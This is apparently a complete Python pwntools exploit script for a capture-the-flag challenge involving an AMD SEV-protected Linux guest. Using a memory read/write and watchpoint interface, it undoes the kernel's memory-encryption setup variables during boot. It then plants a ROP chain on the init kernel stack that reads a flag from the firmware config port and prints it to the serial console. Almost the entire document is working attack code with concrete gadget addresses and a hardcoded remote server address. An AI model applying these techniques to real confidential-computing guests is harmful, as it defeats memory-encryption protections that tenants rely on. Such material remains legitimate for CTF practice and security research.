#!/usr/bin/env python3
import struct
import subprocess

from pwn import *


def connect():
    if args.LOCAL:
        return remote("127.0.0.1", 10218)
    tube = remote("5.75.128.116", 10218)
    tube.recvuntil(b'please give S such that sha256(unhex("')
    challenge = tube.recvuntil(b'"', drop=True)
    tube.recvuntil(b" ends with ")
    bits = int(tube.recvuntil(b" ", drop=True))
    response = subprocess.check_output(["./pow-solver", str(bits), challenge.decode()])
    tube.send(response)
    return tube


PROMPT = b"8. Clear watched page\n"


def read_data(tube, addr, count):
    tube.sendlineafter(PROMPT, b"1")
    tube.sendlineafter(b"Physical Adddress (hex):\n", hex(addr).encode())
    tube.sendlineafter(b"Num bytes:\n", str(count).encode())
    tube.recvuntil(b"Data: ")
    return bytes.fromhex(tube.readline().decode())


def write_data(tube, addr, data):
    tube.sendlineafter(PROMPT, b"2")
    tube.sendlineafter(b"Physical Adddress (hex):\n", hex(addr).encode())
    tube.sendlineafter(b"Num bytes:\n", str(len(data)).encode())
    tube.sendafter(b"Data: ", data)


def listen(tube, count):
    tube.sendlineafter(PROMPT, b"3")
    tube.sendlineafter(b"Num bytes:\n", str(count).encode())
    return tube.readn(count)


def listen_until(tube, pattern):
    tube.sendlineafter(PROMPT, b"4")
    tube.sendlineafter(b"Num bytes:\n", str(len(pattern)).encode())
    tube.sendafter(b"Pattern:\n", pattern)


def watch(tube, addr):
    tube.sendlineafter(PROMPT, b"5")
    tube.sendlineafter(b"Physical Adddress (hex):\n", hex(addr).encode())


def is_hit(tube):
    tube.sendlineafter(PROMPT, b"6")
    reply = tube.recvline().strip()
    if reply == b"Yes":
        return True
    if reply == b"No":
        return False
    raise RuntimeError("Unexpected reply")


def wait_hit(tube):
    while not is_hit(tube):
        time.sleep(5)


def resume(tube):
    tube.sendlineafter(PROMPT, b"7")


def clear_watch(tube):
    tube.sendlineafter(PROMPT, b"8")


def sev_mask(addr):
    return (1 << 47) | addr


early_serial_base = 0x3F8
FW_CFG_IO_BASE = 0x510
__top_init_kernel_stack = 0x2803F58
# 16-byte encrypted blocks containing variables set by sme_enable():
# * sme_me_mask
# * physical_mask
# * cc_vendor
# * cc_mask
AES_BLOCK_ADDRS = [0x26FA9B0, 0x2708CB0, 0x281F180]
# Not really, but larger than everything we care about.
_end = 0x2820000
verify_cpu = 0x1C21E90
startup_64 = 0x1C0098A
vmlinux = 0x1C00000
boot_efi = 0xBC18000
sev_verify_cbit = 0x1C21FA0
mov_cr3_rax = 0x1C009E7


def read_aes_blocks(tube):
    aes_blocks = []
    for aes_block_addr in AES_BLOCK_ADDRS:
        aes_blocks.append(read_data(tube, aes_block_addr, 16))
    return aes_blocks


def write_aes_blocks(tube, aes_blocks):
    for aes_block_addr, block in zip(AES_BLOCK_ADDRS, aes_blocks):
        write_data(tube, aes_block_addr, block)


def main():
    with connect() as tube:
        # Wait until vmlinux decompression begins.
        # Read out lines from UART to prevent boredom and hangs.
        watch(tube, sev_mask(vmlinux))
        listen_until(tube, b"CMOS:")
        listen_until(tube, b"[Bds]Booting linux_image")
        listen_until(tube, b"Loading driver at 0x0000BC18000 EntryPoint=0x0000C06EBBA")
        listen_until(tube, b'BdsDxe: starting Boot0002 "linux_image"')
        wait_hit(tube)

        # Wait for return from decompress_kernel() to efi_stub_entry().
        clear_watch(tube)
        watch(tube, sev_mask(boot_efi + 0x455FC3))
        resume(tube)
        wait_hit(tube)

        # Wait for vmlinux startup.
        clear_watch(tube)
        watch(tube, sev_mask(startup_64))
        resume(tube)
        for _ in range(10):
            listen_until(tube, b"SetUefiImageMemoryAttributes")
        listen_until(tube, b"\n")
        wait_hit(tube)

        # Save the variables.
        aes_blocks = read_aes_blocks(tube)

        # verify_cpu() is called between sme_enable() and __startup_64(),
        # which is a perfect time to restore the variables. It's also located
        # in a distinct page.
        clear_watch(tube)
        watch(tube, sev_mask(verify_cpu))
        resume(tube)
        wait_hit(tube)

        # Dump the new variables (for debugging) and restore the old ones.
        # Now __startup_64() will not set the encryption PTE bit.
        read_aes_blocks(tube)
        write_aes_blocks(tube, aes_blocks)

        # sev_verify_cbit() is called right before changing the page tables.
        clear_watch(tube)
        watch(tube, sev_mask(sev_verify_cbit))
        resume(tube)
        wait_hit(tube)

        # Wait until return from sev_verify_cbit() to startup_64().
        # The kernel will not write to stack after this point.
        clear_watch(tube)
        watch(tube, sev_mask(mov_cr3_rax))
        resume(tube)
        wait_hit(tube)

        # The kernel is about to switch page tables, after which the data will
        # no longer be encrypted. Right after this, it will jump to
        # common_startup_64_ptr. Write ROP to copy the flag from the firmware
        # config to the serial console.

        flag_index = 47
        flag_len = 100

        # common_startup_64_ptr = pop rax ; ret
        write_data(tube, 0x2CA1070, struct.pack("<Q", 0x1DE2DD4))
        # ROP
        write_data(
            tube,
            __top_init_kernel_stack,
            b"".join(
                (
                    # this rop slot is cursed and I don't know why
                    struct.pack("<Q", 0),
                    # pop rax ; ret
                    struct.pack("<QQ", 0x1DE2DD4, flag_index),
                    # pop rdx ; ret
                    struct.pack("<QQ", 0x1D70D82, FW_CFG_IO_BASE),
                    # out dx, ax ; jmp 0xffffffff817bd0e0 -> ret
                    struct.pack("Q", 0x207BD3E),
                )
            )
            + b"".join(
                (
                    # pop rdx ; ret
                    struct.pack("<QQ", 0x1D70D82, FW_CFG_IO_BASE),
                    # in al, dx ; ret
                    struct.pack("<Q", 0x203FB60),
                    # pop rdx ; ret
                    struct.pack("<QQ", 0x1D70D82, early_serial_base),
                    # out dx, al ; ret
                    struct.pack("<Q", 0x1D78A37),
                )
            )
            * flag_len,
        )
        clear_watch(tube)
        resume(tube)
        listen(tube, flag_len)

        # hxp{m4sT3rS_0f_m3M0ry_C0rrUpt1ON_0wN_m3m0rY_eNcrYpt10n}
        tube.interactive()


if __name__ == "__main__":
    main()
